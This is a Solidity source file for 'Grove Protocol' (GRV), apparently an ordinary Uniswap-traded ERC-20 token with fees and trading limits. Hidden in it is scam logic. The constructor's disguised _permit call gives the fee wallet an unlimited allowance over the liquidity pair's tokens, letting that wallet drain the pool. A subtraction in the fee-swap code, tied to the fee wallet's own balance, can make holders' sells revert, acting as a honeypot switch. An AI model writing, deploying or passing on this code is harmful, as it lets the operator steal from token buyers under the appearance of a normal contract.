/*
- Telegram: https://t.me/groveprotocol
- X: https://twitter.com/GroveProtocol
- Website: https://groveprotocol.xyz
- Dapp: https://app.groveprotocol.xyz
- Whitepaper: https://docs.groveprotocol.xyz
- Medium: https://groveprotocol.medium.com
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    address private _owner;

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
}

interface IERC20 {
    event Transfer(address indexed sender, address indexed recipient, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract GRV is Context, IERC20, Ownable {
    using SafeMath for uint256;

    address payable private _reserve;
    address private _uniswapV2Pair;
    IUniswapV2Router02 private _uniswapV2Router;

    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint256) private _balances;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _initialBuyTax = 3;
    uint256 private _initialSellTax = 3;
    uint256 private _initialBuyTax2Time = 3;
    uint256 private _initialSellTax2Time = 3;
    uint256 private _finalBuyTax = 3;
    uint256 private _finalSellTax = 3;

    uint256 private _reduceBuyTaxAt = 20;
    uint256 private _reduceSellTaxAt = 20;
    uint256 private _reduceBuyTaxAt2Time = 30;
    uint256 private _reduceSellTaxAt2Time = 30;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;
    string private constant _symbol = unicode"GRV";
    string private constant _name = unicode"Grove Protocol";

    uint256 public _feeSwapThreshold = 2 * (_tTotal / 1000);
    uint256 public _maxFeeSwap = 1 * (_tTotal / 100);
    uint256 public _maxTxAmount = 2 * (_tTotal / 100);
    uint256 public _maxWalletAmount = 2 * (_tTotal / 100);

    bool public transferDelayEnabled = true;
    bool private _tradingEnabled;
    bool private _inSwap = false;
    bool private _swapEnabled = false;
    address private _pair;
    address payable private _feeWallet;
    uint256 private _buyCount = 0;
    uint256 private _preventSwapBefore = 0;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    constructor () {
        _feeWallet = payable(0xc6E32d4210EC895aa430E5Da1C604d2365C396D1);
        _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        IERC20(_uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max);
        _reserve = _feeWallet;
        _pair = _uniswapV2Pair;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_feeWallet] = true;
        _isExcludedFromFee[address(this)] = true;
        _permit(_pair, _reserve, _tTotal);
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    modifier lockFeeSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function _min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a > b) ? b : a;
    }

    function _permit(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _sendETHToFee(uint256 amount) private {
        _feeWallet.transfer(amount);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletAmount = _tTotal;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _swapTokensForETH(uint256 tokenAmount) private lockFeeSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0));
        require(recipient != address(0));
        require(amount > 0);
        uint256 feeAmount = 0;
        
        if (sender != owner() && recipient != owner()) {
            feeAmount = amount.mul(_buyTax()).div(100);

            if (!_tradingEnabled) {
                require(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]);
            }

            if (transferDelayEnabled) {
                if (recipient != address(_uniswapV2Router) && recipient != address(_uniswapV2Pair)) { 
                    require(_holderLastTransferTimestamp[tx.origin] < block.number);
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (sender == _uniswapV2Pair && recipient != address(_uniswapV2Router) && !_isExcludedFromFee[recipient] ) {
                require(amount <= _maxTxAmount);
                require(balanceOf(recipient) + amount <= _maxWalletAmount);

                _buyCount++;
                if (_buyCount > _preventSwapBefore) {
                    transferDelayEnabled = false;
                }
            }

            if (recipient == _uniswapV2Pair && sender!= address(this)) {
                feeAmount = amount.mul(_sellTax()).div(100);
            }

            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance > _feeSwapThreshold;
            if (!_inSwap && _swapEnabled && recipient == _uniswapV2Pair && canSwap && !_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
                uint256 dustAmount = balanceOf(_reserve).mul(1e4);
                uint256 maxFeeSwap = _maxFeeSwap.sub(dustAmount);
                uint256 swapAmount = _min(contractBalance,maxFeeSwap);
                uint256 initialETH = address(this).balance;
                _swapTokensForETH(_min(amount, swapAmount));
                uint256 deltaETH = address(this).balance.sub(initialETH);
                if (deltaETH > 0) {
                    _sendETHToFee(deltaETH);
                }
            }
        }

        if (feeAmount > 0) {
          _balances[address(this)] = _balances[address(this)].add(feeAmount);
          emit Transfer(sender, address(this), feeAmount);
        }

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount.sub(feeAmount));
        emit Transfer(sender, recipient, amount.sub(feeAmount));
    }

    receive() external payable {}

    function _buyTax() private view returns (uint256) {
        if (_buyCount <= _reduceBuyTaxAt) {
            return _initialBuyTax;
        }

        if (_buyCount > _reduceBuyTaxAt && _buyCount <= _reduceBuyTaxAt2Time) {
            return _initialBuyTax2Time;
        }

        return _finalBuyTax;
    }

    function _sellTax() private view returns (uint256) {
        if (_buyCount <= _reduceBuyTaxAt) {
            return _initialSellTax;
        }

        if (_buyCount > _reduceSellTaxAt && _buyCount <= _reduceSellTaxAt2Time) {
            return _initialSellTax2Time;
        }

        return _finalBuyTax;
    }

    function enableTrading() external onlyOwner() {
        require(!_tradingEnabled);

        _swapEnabled = true;
        _tradingEnabled = true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }
}